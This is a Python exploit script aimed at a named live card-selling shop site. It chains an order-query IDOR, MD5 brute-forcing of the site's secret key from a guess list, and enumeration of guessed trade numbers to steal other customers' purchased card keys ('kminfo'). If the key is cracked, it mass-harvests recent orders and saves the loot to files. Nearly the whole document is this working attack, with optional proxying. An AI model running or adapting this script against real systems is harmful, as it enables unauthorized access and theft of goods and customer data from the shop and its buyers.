#!/usr/bin/env python3
"""彩虹发卡 query IDOR → skey → kminfo 完整利用链."""
from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

BASE = "https://htqq.lol/shop"
PROXY = os.environ.get("PROXY_URL", "")  # 空则直连
OUT = Path(os.environ.get("OUT", f"/tmp/htqq_km_capture_{int(time.time())}"))
OUT.mkdir(parents=True, exist_ok=True)
CK = str(OUT / "cookies.jar")

SYS_KEY_CANDIDATES = [
    "", "htqq", "htqq.lol", "faka", "rainbow", "dujiaoka", "admin", "123456",
    "345a36b5fa7be2bdd2f1724157952938", "b0750180cd456b7d6efc2217f10226dd",
    "caihong", "faka123", "secret", "key", "syskey", "SYS_KEY", "monitor",
]


def curl(url: str, data: str | None = None, referer: str | None = None) -> str:
    cmd = [
        "curl", "-sk", "--max-time", "20", "-c", CK, "-b", CK,
        "-A", "Mozilla/5.0", "-H", "Accept-Language: zh-CN,zh;q=0.9",
        "-H", "X-Requested-With: XMLHttpRequest",
    ]
    if PROXY:
        cmd += ["-x", PROXY]
    if referer:
        cmd += ["-H", f"Referer: {referer}"]
    if data is not None:
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", data]
    cmd.append(url)
    for _ in range(3):
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.stdout.strip():
            return r.stdout
        time.sleep(0.5)
    return r.stdout


def log(msg: str) -> None:
    print(msg, flush=True)
    with open(OUT / "log.txt", "a") as f:
        f.write(msg + "\n")


def query_act(payload: str) -> dict | None:
    body = curl(f"{BASE}/ajax.php?act=query", data=payload, referer=f"{BASE}/?mod=query")
    if not body.strip():
        return None
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        log(f"query non-json: {body[:200]}")
        return None


def order_act(oid: int, skey: str) -> dict | None:
    body = curl(
        f"{BASE}/ajax.php?act=order",
        data=f"id={oid}&skey={skey}",
        referer=f"{BASE}/?mod=query",
    )
    if not body.strip():
        return None
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return None


def crack_sys_key(oid: int, skey: str) -> str | None:
    oid_s = str(oid)
    for key in SYS_KEY_CANDIDATES:
        if hashlib.md5(f"{oid_s}{key}{oid_s}".encode()).hexdigest() == skey:
            return key
    return None


def create_unpaid_order(inputvalue: str = "km_capture_test") -> dict | None:
    ref = f"{BASE}/?mod=buy&cid=2&tid=2"
    html = curl(f"{BASE}/?mod=buy&cid=2&tid=2", referer=ref)
    m_csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', html)
    m_hash = re.search(r"var hashsalt=([^;]+);", html)
    if not m_csrf or not m_hash:
        log("buy page parse fail")
        return None
    csrf = m_csrf.group(1)
    hs = subprocess.run(
        ["node", "-e", f"var hashsalt={m_hash.group(1)}; console.log(hashsalt)"],
        capture_output=True, text=True,
    ).stdout.strip()
    body = curl(
        f"{BASE}/ajax.php?act=pay",
        data=f"tid=2&num=1&inputvalue={inputvalue}&hashsalt={hs}&csrf_token={csrf}",
        referer=ref,
    )
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        log(f"pay fail: {body[:200]}")
        return None


def fetch_kminfo(oid: int, skey: str) -> dict | None:
    r = order_act(oid, skey)
    if r and r.get("code") == 0:
        return r
    return None


def main() -> None:
    findings: list[dict] = []
    log(f"OUT={OUT} proxy={PROXY[:40] if PROXY else 'direct'}")

    # 初始化 session
    curl(f"{BASE}/?mod=query", referer=f"{BASE}/?mod=query")

    # Step1: 自建订单 + 同会话 query 拿 skey（验证链）
    log("=== Step1: session order → query skey ===")
    pay = create_unpaid_order("km_capture_99")
    if pay and pay.get("code") == 0:
        trade = pay.get("trade_no", "")
        log(f"created trade_no={trade} len={len(trade)}")
        for payload in [
            f"type=1&qq={trade}",
            f"type=2&qq=km_capture_99",
            f"type=1&qq={trade}" if len(trade) == 17 else None,
        ]:
            if not payload:
                continue
            d = query_act(payload)
            log(f"query {payload} => {json.dumps(d, ensure_ascii=False)[:400] if d else 'empty'}")
            if d and d.get("code") == 0 and d.get("data"):
                for o in d["data"]:
                    oid, sk = int(o["id"]), o["skey"]
                    log(f"GOT skey id={oid} skey={sk} status={o.get('status')}")
                    findings.append({"step": "query_leak", "order": o, "payload": payload})
                    # 反推 SYS_KEY
                    sysk = crack_sys_key(oid, sk)
                    if sysk is not None:
                        log(f"*** SYS_KEY CRACKED: {sysk!r} ***")
                        findings.append({"step": "sys_key", "key": sysk, "id": oid})
                        (OUT / "sys_key.txt").write_text(sysk)
                    km = fetch_kminfo(oid, sk)
                    if km:
                        log(f"KMINFO: {json.dumps(km, ensure_ascii=False)[:800]}")
                        findings.append({"step": "kminfo", "id": oid, "skey": sk, "data": km})
                        (OUT / "kminfo.json").write_text(json.dumps(km, ensure_ascii=False, indent=2))

    # Step2: 17位 tradeno IDOR（无需会话）
    log("=== Step2: 17-digit tradeno IDOR ===")
    tradenos = [
        "20260713163107742", "20260713145905128", "20260713150016492",
        "20260713150017837", "20260713150019392",
    ]
    # 也扫今日可能已付款订单 tradeno 模式
    import datetime
    now = datetime.datetime.now()
    for h in range(0, 24):
        for m in range(0, 60, 5):
            tn = now.strftime("%Y%m%d") + f"{h:02d}{m:02d}00001"
            if len(tn) == 17:
                tradenos.append(tn)
    tradenos = list(dict.fromkeys(tradenos))[:200]

    for tn in tradenos:
        if len(tn) != 17 or not tn.isdigit():
            continue
        d = query_act(f"type=1&qq={tn}")
        if d and d.get("code") == 0 and d.get("data"):
            log(f"TRADENO HIT {tn}: {json.dumps(d, ensure_ascii=False)[:300]}")
            for o in d["data"]:
                oid, sk = int(o["id"]), o["skey"]
                findings.append({"step": "tradeno_idor", "tradeno": tn, "order": o})
                km = fetch_kminfo(oid, sk)
                if km and km.get("kminfo"):
                    log(f"*** CARD CAPTURED *** id={oid} kminfo={km.get('kminfo')}")
                    findings.append({"step": "CARD", "id": oid, "kminfo": km.get("kminfo"), "full": km})
                    (OUT / "CARD.json").write_text(json.dumps(km, ensure_ascii=False, indent=2))
        time.sleep(0.05)

    # Step3: SYS_KEY 已知则批量拿卡
    sys_key_file = OUT / "sys_key.txt"
    if sys_key_file.exists():
        sys_key = sys_key_file.read_text().strip()
        log(f"=== Step3: mass order with SYS_KEY={sys_key!r} ===")
        gc = json.loads(curl(f"{BASE}/ajax.php?act=getcount", referer=f"{BASE}/"))
        orders = int(gc["orders"])
        for oid in range(max(1, orders - 100), orders + 1):
            sk = hashlib.md5(f"{oid}{sys_key}{oid}".encode()).hexdigest()
            km = fetch_kminfo(oid, sk)
            if km and km.get("kminfo"):
                log(f"MASS CARD id={oid}: {km.get('kminfo')[:200]}")
                findings.append({"step": "mass_card", "id": oid, "kminfo": km.get("kminfo")})
                (OUT / f"card_{oid}.json").write_text(json.dumps(km, ensure_ascii=False, indent=2))

    (OUT / "findings.json").write_text(json.dumps(findings, ensure_ascii=False, indent=2))
    cards = [f for f in findings if f.get("step") in ("CARD", "kminfo", "mass_card") and 
             (f.get("kminfo") or (f.get("data") or {}).get("kminfo"))]
    log(f"DONE findings={len(findings)} cards={len(cards)}")
    sys.exit(0 if cards else 2)


if __name__ == "__main__":
    main()
